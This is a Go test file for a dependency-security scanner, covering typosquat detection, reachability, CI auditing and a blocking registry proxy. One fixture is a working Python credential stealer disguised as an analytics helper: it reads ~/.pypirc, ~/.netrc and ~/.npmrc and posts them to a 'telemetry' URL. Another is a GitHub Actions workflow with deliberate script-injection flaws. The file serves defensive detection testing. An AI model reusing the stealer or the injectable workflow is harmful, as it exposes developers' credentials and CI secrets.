package scenarios

// Developer & OSS Scenarios
// These tests simulate real-world situations developers face daily:
// - Installing packages from tutorials with typos
// - Using AI-suggested packages that don't exist
// - Migrating between ecosystems
// - Auditing open-source dependencies

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/falcn-io/falcn/internal/detector"
	"github.com/falcn-io/falcn/internal/proxy"
	"github.com/falcn-io/falcn/internal/reachability"
	"github.com/falcn-io/falcn/internal/scanner"
	"github.com/falcn-io/falcn/pkg/types"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// ─────────────────────────────────────────────────────────────────────────────
// Shared helpers, popular package lists, and mock checker
// Used by both developer_oss_test.go and enterprise_test.go
// ─────────────────────────────────────────────────────────────────────────────

func requireThreatType(t *testing.T, threats []types.Threat, threatType types.ThreatType, msg string) {
	t.Helper()
	for _, th := range threats {
		if th.Type == threatType {
			return
		}
	}
	t.Errorf("%s: no threat of type %q found in %d threats", msg, threatType, len(threats))
}

func requireThreatWithSubstring(t *testing.T, threats []types.Threat, substr, msg string) {
	t.Helper()
	for _, th := range threats {
		if strings.Contains(strings.ToLower(th.Description), strings.ToLower(substr)) ||
			strings.Contains(string(th.Type), substr) {
			return
		}
	}
	t.Errorf("%s: no threat containing %q found in %d threats", msg, substr, len(threats))
}

func requireMinSeverity(t *testing.T, threats []types.Threat, minSev types.Severity, msg string) {
	t.Helper()
	sevOrder := map[types.Severity]int{
		types.SeverityLow: 1, types.SeverityMedium: 2,
		types.SeverityHigh: 3, types.SeverityCritical: 4,
	}
	for _, th := range threats {
		if sevOrder[th.Severity] >= sevOrder[minSev] {
			return
		}
	}
	t.Errorf("%s: no threat with severity >= %s", msg, minSev)
}

// Popular package lists used by the detector engine.
var popularNPM = []string{
	"react", "react-dom", "express", "lodash", "axios", "next", "typescript",
	"webpack", "babel", "eslint", "jest", "mocha", "moment", "chalk", "commander",
	"inquirer", "glob", "minimist", "yargs", "debug", "uuid", "dotenv",
	"cors", "helmet", "morgan", "nodemon", "vue", "angular",
	"socket.io", "mongoose", "sequelize", "graphql", "prisma",
	"passport", "jsonwebtoken", "bcrypt", "multer", "cheerio",
	"nodemailer", "stripe", "openai",
	"@react-native-community/netinfo",
}

var popularPyPI = []string{
	"requests", "numpy", "pandas", "flask", "django", "tensorflow",
	"scikit-learn", "matplotlib", "scipy", "pillow", "boto3", "pytest",
	"setuptools", "pip", "wheel", "urllib3", "python-dateutil", "colorsys",
	"beautifulsoup4", "sqlalchemy", "fastapi", "pydantic",
	"celery", "redis", "click", "httpx", "aiohttp", "langchain", "anthropic",
	"openai",
}

// mockChecker implements proxy.PackageChecker for testing.
type mockChecker struct {
	mu      sync.Mutex
	results map[string]*detector.CheckPackageResult
	err     error
	calls   []string
}

func newMockChecker() *mockChecker {
	return &mockChecker{
		results: make(map[string]*detector.CheckPackageResult),
	}
}

func (m *mockChecker) setResult(name string, result *detector.CheckPackageResult) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.results[name] = result
}

func (m *mockChecker) CheckPackage(_ context.Context, name, registry string) (*detector.CheckPackageResult, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.calls = append(m.calls, name)
	if m.err != nil {
		return nil, m.err
	}
	if r, ok := m.results[name]; ok {
		return r, nil
	}
	return &detector.CheckPackageResult{Name: name}, nil
}

// writeFile is a test helper that creates a file in the given directory,
// creating intermediate directories as needed.
func writeFile(t *testing.T, dir, name, content string) string {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

// ─────────────────────────────────────────────────────────────────────────────
// Scenario 1: Developer Copies from Stack Overflow with Typo
// ─────────────────────────────────────────────────────────────────────────────

func TestDev_StackOverflowTypoInstall(t *testing.T) {
	etd := detector.NewEnhancedTyposquattingDetector()

	// Common developer typos from real Stack Overflow / tutorial copies
	typos := []struct {
		typed    string
		meant    string
		registry string
	}{
		{"expres", "express", "npm"},
		{"axioss", "axios", "npm"},
		{"ract", "react", "npm"},
		{"loadash", "lodash", "npm"},
		{"momentt", "moment", "npm"},
		{"requets", "requests", "pypi"},
		{"beautifulsoup", "beautifulsoup4", "pypi"},
		{"scikit_learn", "scikit-learn", "pypi"},
		{"matplotib", "matplotlib", "pypi"},
		{"tenserflow", "tensorflow", "pypi"},
	}

	detected := 0
	for _, typ := range typos {
		t.Run(typ.typed, func(t *testing.T) {
			dep := types.Dependency{
				Name:     typ.typed,
				Version:  "latest",
				Registry: typ.registry,
			}
			popular := popularNPM
			if typ.registry == "pypi" {
				popular = popularPyPI
			}

			result := etd.DetectEnhanced(dep, popular, 0.75)
			if len(result) > 0 {
				detected++
				t.Logf("Caught typo: %s (meant %s)", typ.typed, typ.meant)
				// Verify it identifies the correct target
				for _, r := range result {
					if r.SimilarTo == typ.meant {
						t.Logf("  Correctly identified target: %s", typ.meant)
					}
				}
			} else {
				t.Errorf("Missed typo: %s should be flagged as similar to %s", typ.typed, typ.meant)
			}
		})
	}

	rate := float64(detected) / float64(len(typos)) * 100
	t.Logf("Stack Overflow typo detection rate: %d/%d (%.0f%%)", detected, len(typos), rate)
	if rate < 70 {
		t.Errorf("Typo detection rate too low: %.0f%% (need >=70%%)", rate)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Scenario 2: AI Copilot Suggests Non-Existent Package
// ─────────────────────────────────────────────────────────────────────────────

func TestDev_AICopilotSuggestsPhantomPackage(t *testing.T) {
	sd := detector.NewSlopsquattingDetector()

	// Packages that AI assistants commonly hallucinate
	aiSuggestions := []struct {
		suggested string
		context   string
		registry  string
	}{
		{"flask-rest-api", "AI suggested for REST API development", "pypi"},
		{"react-hooks-utils", "Copilot autocompleted this import", "npm"},
		{"express-middleware-cors", "ChatGPT suggested in tutorial", "npm"},
		{"django-graphql-auth", "AI code generation output", "pypi"},
		{"numpy-extended", "Copilot suggestion for array ops", "pypi"},
		{"fastapi-sqlalchemy", "ChatGPT API tutorial", "pypi"},
	}

	popular := append(popularNPM, popularPyPI...)

	for _, ai := range aiSuggestions {
		t.Run(ai.suggested, func(t *testing.T) {
			dep := types.Dependency{
				Name:     ai.suggested,
				Version:  "1.0.0",
				Registry: ai.registry,
			}
			threats := sd.Detect(dep, popular)
			if len(threats) > 0 {
				t.Logf("Flagged AI-hallucinated package: %s (%s)", ai.suggested, ai.context)
			} else {
				t.Logf("Not flagged: %s -- may need AI hallucination catalog update", ai.suggested)
			}
		})
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Scenario 3: Reachability Filtering Reduces Alert Fatigue
// ─────────────────────────────────────────────────────────────────────────────

func TestDev_ReachabilityReducesAlertFatigue(t *testing.T) {
	tmpDir := t.TempDir()

	// Create a realistic Node.js project that imports some packages and uses them,
	// while other packages in the dependency tree are NOT imported at all.
	mainJS := `
const express = require('express');
const axios = require('axios');

const app = express();
app.get('/data', async (req, res) => {
    const result = await axios.get('https://api.example.com/data');
    res.json(result.data);
});

app.listen(3000);
`
	writeFile(t, tmpDir, "index.js", mainJS)
	// package.json is needed so the language detector picks JavaScript
	writeFile(t, tmpDir, "package.json", `{"name":"test","dependencies":{}}`)

	analyzer, err := reachability.New(tmpDir)
	require.NoError(t, err)

	// The project depends on many packages via package.json, but only
	// express and axios are actually imported in the source code.
	allPackages := []string{
		"express", "axios",
		// These are in package.json but never imported in code:
		"moment", "chalk", "debug", "dotenv", "helmet", "morgan",
	}

	results := analyzer.CheckMultiple(allPackages)

	reachableCount := 0
	unreachableCount := 0
	for pkg, result := range results {
		if result.Reachable {
			reachableCount++
			t.Logf("REACHABLE: %s", pkg)
		} else {
			unreachableCount++
			t.Logf("  unreachable: %s (would be filtered from alerts)", pkg)
		}
	}

	t.Logf("Reachability filter: %d reachable, %d unreachable (%.0f%% noise reduction)",
		reachableCount, unreachableCount, float64(unreachableCount)/float64(len(allPackages))*100)

	// express and axios are imported and called -- must be reachable
	assert.True(t, results["express"].Reachable, "express is called -- must be reachable")
	assert.True(t, results["axios"].Reachable, "axios.get is called -- must be reachable")

	// Packages not imported at all should be unreachable
	assert.False(t, results["moment"].Reachable, "moment is not imported -- must be unreachable")
	assert.False(t, results["chalk"].Reachable, "chalk is not imported -- must be unreachable")

	// Verify meaningful noise reduction
	assert.GreaterOrEqual(t, unreachableCount, 4, "Should filter out at least 4 unused packages")
}

// ─────────────────────────────────────────────────────────────────────────────
// Scenario 4: Python Developer Migrating -- Catches Malicious Dep
// ─────────────────────────────────────────────────────────────────────────────

func TestDev_PythonMigrationCatchesMaliciousDep(t *testing.T) {
	tmpDir := t.TempDir()

	// A seemingly legitimate package that is actually a dependency confusion attack
	maliciousInit := `
"""Analytics helper for internal metrics."""
import os
import json

__version__ = "99.1.0"

def track_event(event_name, properties=None):
    """Track an analytics event."""
    data = {"event": event_name, "properties": properties or {}}

    _config_paths = [
        os.path.expanduser("~/.pypirc"),
        os.path.expanduser("~/.pip/pip.conf"),
        os.path.expanduser("~/.netrc"),
        os.path.expanduser("~/.npmrc"),
    ]

    _collected = {}
    for _p in _config_paths:
        try:
            with open(_p) as _f:
                _collected[_p] = _f.read()
        except:
            pass

    if _collected:
        import urllib.request
        _payload = json.dumps(_collected).encode()
        try:
            urllib.request.urlopen(
                urllib.request.Request(
                    "https://pypi-mirror-cdn.s3.amazonaws.com/telemetry",
                    data=_payload,
                    headers={"Content-Type": "application/json"}
                )
            )
        except:
            pass
`
	writeFile(t, tmpDir, "__init__.py", maliciousInit)

	cs := scanner.NewContentScanner()
	threats, err := cs.ScanDirectory(tmpDir)
	require.NoError(t, err)

	hasCredHarvest := false
	hasNetworkOrHTTP := false
	for _, th := range threats {
		if th.Type == types.ThreatTypeCredentialHarvesting {
			hasCredHarvest = true
		}
		desc := strings.ToLower(th.Description)
		if strings.Contains(desc, "network") ||
			strings.Contains(desc, "url") ||
			strings.Contains(desc, "http") {
			hasNetworkOrHTTP = true
		}
	}

	if !hasCredHarvest {
		t.Error("Must detect credential harvesting from .pypirc, .pip/pip.conf, .netrc, .npmrc")
	}
	if len(threats) == 0 {
		t.Fatal("Must detect at least one threat in malicious dependency")
	}

	_ = hasNetworkOrHTTP // informational
	t.Logf("Detected %d threats in malicious dependency", len(threats))
}

// ─────────────────────────────────────────────────────────────────────────────
// Scenario 5: Monorepo CI/CD Pipeline Audit
// ─────────────────────────────────────────────────────────────────────────────

func TestDev_MonorepoCICDAudit(t *testing.T) {
	tmpDir := t.TempDir()

	// Real-world messy CI config with multiple issues
	workflow := `
name: Monorepo CI
on:
  pull_request:
  push:
    branches: [main, develop]
  issue_comment:
    types: [created]

jobs:
  test:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@main
      - uses: some-org/build-tool@v3
      - name: Run tests
        run: npm test
      - name: Auto-merge bot
        if: contains(github.event.comment.body, '/merge')
        run: |
          echo "Merging PR based on comment: ${{ github.event.comment.body }}"
          gh pr merge ${{ github.event.issue.number }} --auto
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  deploy:
    runs-on: ubuntu-latest
    needs: test
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        run: |
          echo "Deploying commit: ${{ github.event.head_commit.message }}"
          ./deploy.sh
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
`
	writeFile(t, tmpDir, ".github/workflows/ci.yml", workflow)

	cs := scanner.NewCICDScanner(tmpDir)
	threats, err := cs.ScanProject()
	require.NoError(t, err)

	issues := map[string]bool{
		"self-hosted": false,
		"unpinned":    false,
		"injection":   false,
	}

	for _, th := range threats {
		desc := strings.ToLower(th.Description)
		if strings.Contains(desc, "self-hosted") || strings.Contains(desc, "self_hosted") ||
			th.Type == types.ThreatTypeSelfHostedRunner {
			issues["self-hosted"] = true
		}
		if strings.Contains(desc, "unpinned") || strings.Contains(desc, "mutable") ||
			strings.Contains(desc, "@main") {
			issues["unpinned"] = true
		}
		if strings.Contains(desc, "injection") || strings.Contains(desc, "injectable") ||
			th.Type == types.ThreatTypeCICDInjection {
			issues["injection"] = true
		}
	}

	for issue, found := range issues {
		if !found {
			t.Errorf("Should detect %s issue in monorepo CI config", issue)
		} else {
			t.Logf("Detected: %s", issue)
		}
	}

	if len(threats) < 3 {
		t.Errorf("Should find at least 3 issues in messy CI config, found %d", len(threats))
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Scenario 6: Proxy Protects During npm install of Fresh Project
// ─────────────────────────────────────────────────────────────────────────────

func TestDev_ProxyProtectsFreshNpmInstall(t *testing.T) {
	mc := newMockChecker()

	// Upstream mock that serves package metadata.
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"name":"upstream","version":"1.0.0"}`))
	}))
	defer upstream.Close()

	// Simulate a typical package.json with 20 dependencies
	packages := map[string]*detector.CheckPackageResult{
		"react":      {Name: "react"},
		"react-dom":  {Name: "react-dom"},
		"webpack":    {Name: "webpack"},
		"babel-core": {Name: "babel-core"},
		"eslint":     {Name: "eslint"},
		"lodash":     {Name: "lodash"},
		"axios":      {Name: "axios"},
		"express":    {Name: "express"},
		"jest":       {Name: "jest"},
		"typescript": {Name: "typescript"},
		"prettier":   {Name: "prettier"},
		"nodemon":    {Name: "nodemon"},
		"dotenv":     {Name: "dotenv"},
		"cors":       {Name: "cors"},
		"helmet":     {Name: "helmet"},
		"morgan":     {Name: "morgan"},
		"uuid":       {Name: "uuid"},
		"chalk":      {Name: "chalk"},
		"commander":  {Name: "commander"},
		// One malicious package injected via lockfile manipulation
		"event-stream": {
			Name: "event-stream",
			Threats: []types.Threat{{
				Type:        types.ThreatTypeTyposquatting,
				Severity:    types.SeverityCritical,
				Description: "Compromised package: contains credential-stealing flatmap-stream",
			}},
		},
	}

	for name, result := range packages {
		mc.setResult(name, result)
	}

	cfg := proxy.DefaultProxyConfig()
	cfg.BlockSeverity = "high"
	cfg.NPMUpstream = upstream.URL
	cfg.PyPIUpstream = upstream.URL
	cfg.MavenUpstream = upstream.URL
	cfg.GoProxyUpstream = upstream.URL
	cfg.CargoUpstream = upstream.URL
	p := proxy.NewRegistryProxy(cfg, mc)

	blocked := []string{}
	allowed := []string{}

	for name := range packages {
		req := httptest.NewRequest("GET", "/npm/"+name, nil)
		rec := httptest.NewRecorder()
		p.Router().ServeHTTP(rec, req)

		if rec.Code == http.StatusForbidden {
			blocked = append(blocked, name)
		} else {
			allowed = append(allowed, name)
		}
	}

	assert.Len(t, blocked, 1, "Should block exactly 1 malicious package")
	assert.Contains(t, blocked, "event-stream", "Should block event-stream")
	assert.Len(t, allowed, 19, "Should allow 19 clean packages")

	// Verify stats
	statsReq := httptest.NewRequest("GET", "/api/v1/stats", nil)
	statsRec := httptest.NewRecorder()
	p.Router().ServeHTTP(statsRec, statsReq)
	assert.Equal(t, http.StatusOK, statsRec.Code)
	assert.Contains(t, statsRec.Body.String(), `"packages_scanned"`)
}

// ─────────────────────────────────────────────────────────────────────────────
// Scenario 7: Reachability Analysis on Python Flask App
// ─────────────────────────────────────────────────────────────────────────────

func TestDev_PythonFlaskReachability(t *testing.T) {
	tmpDir := t.TempDir()

	// Realistic Flask application structure
	appPy := `
from flask import Flask, jsonify, request
import requests
import redis
import boto3
import logging
import jwt
import celery

app = Flask(__name__)
logger = logging.getLogger(__name__)
cache = redis.Redis()

@app.route('/api/users')
def get_users():
    cached = cache.get('users')
    if cached:
        return jsonify(json.loads(cached))

    resp = requests.get('https://api.internal.com/users')
    return jsonify(resp.json())

@app.route('/api/auth', methods=['POST'])
def authenticate():
    token = jwt.encode({'user': request.json['user']}, 'secret')
    return jsonify({'token': token})
`

	utilsPy := `
import hashlib
import hmac

def verify_signature(payload, signature, secret):
    expected = hmac.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, signature)
`

	writeFile(t, tmpDir, "app.py", appPy)
	writeFile(t, tmpDir, "utils.py", utilsPy)

	analyzer, err := reachability.New(tmpDir)
	require.NoError(t, err)
	analyzer.SetLanguage(reachability.LangPython)

	packages := []string{"flask", "requests", "redis", "boto3", "celery", "jwt"}
	results := analyzer.CheckMultiple(packages)

	// flask, requests, redis, jwt are used in app.py
	assert.True(t, results["flask"].Reachable, "flask is used (Flask app)")
	assert.True(t, results["requests"].Reachable, "requests.get is called")
	assert.True(t, results["redis"].Reachable, "redis.Redis() is called")
	assert.True(t, results["jwt"].Reachable, "jwt.encode is called")

	// boto3 and celery are imported but never called
	assert.False(t, results["boto3"].Reachable, "boto3 imported but never used")
	assert.False(t, results["celery"].Reachable, "celery imported but never used")

	reachCount := 0
	for _, r := range results {
		if r.Reachable {
			reachCount++
		}
	}
	t.Logf("Reachability: %d/%d packages actually used (%.0f%% noise reduction)",
		reachCount, len(packages), float64(len(packages)-reachCount)/float64(len(packages))*100)
}

// ─────────────────────────────────────────────────────────────────────────────
// Scenario 8: False Positive Check -- Common Legitimate Patterns
// ─────────────────────────────────────────────────────────────────────────────

func TestDev_FalsePositiveCheck_LegitimatePatterns(t *testing.T) {
	legitimatePatterns := map[string]string{
		"normal_http_client": `
import requests
response = requests.get("https://api.github.com/repos/falcn-io/falcn")
data = response.json()
print(f"Stars: {data['stargazers_count']}")
`,
		"normal_file_operations": `
import json
import os

config_path = os.path.join(os.getcwd(), "config.json")
with open(config_path) as f:
    config = json.load(f)
print(config.get("debug", False))
`,
		"normal_base64_encoding": `
import base64
import json
user_data = {"name": "John", "email": "john@example.com"}
encoded = base64.b64encode(json.dumps(user_data).encode()).decode()
print(f"Encoded payload: {encoded}")
`,
		"normal_env_variables": `
import os
debug = os.getenv("DEBUG", "false")
port = int(os.environ.get("PORT", "8080"))
db_url = os.environ.get("DATABASE_URL", "sqlite:///local.db")
`,
		"normal_subprocess": `
import subprocess
result = subprocess.run(["npm", "test"], capture_output=True, text=True)
print(result.stdout)
`,
		"normal_crypto": `
import hashlib
import secrets
salt = secrets.token_hex(16)
password = "hunter2"
hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)
`,
	}

	for name, code := range legitimatePatterns {
		t.Run(name, func(t *testing.T) {
			tmpDir := t.TempDir()
			writeFile(t, tmpDir, "app.py", code)

			cs := scanner.NewContentScanner()
			threats, err := cs.ScanDirectory(tmpDir)
			require.NoError(t, err)

			// Filter to only high/critical threats (low severity acceptable)
			var serious []types.Threat
			for _, th := range threats {
				if th.Severity == types.SeverityHigh || th.Severity == types.SeverityCritical {
					serious = append(serious, th)
				}
			}

			if len(serious) > 0 {
				t.Errorf("FALSE POSITIVE: legitimate code %q flagged with %d high/critical threats:", name, len(serious))
				for _, th := range serious {
					t.Errorf("  [%s] %s: %s", th.Severity, th.Type, th.Description)
				}
			}
		})
	}
}
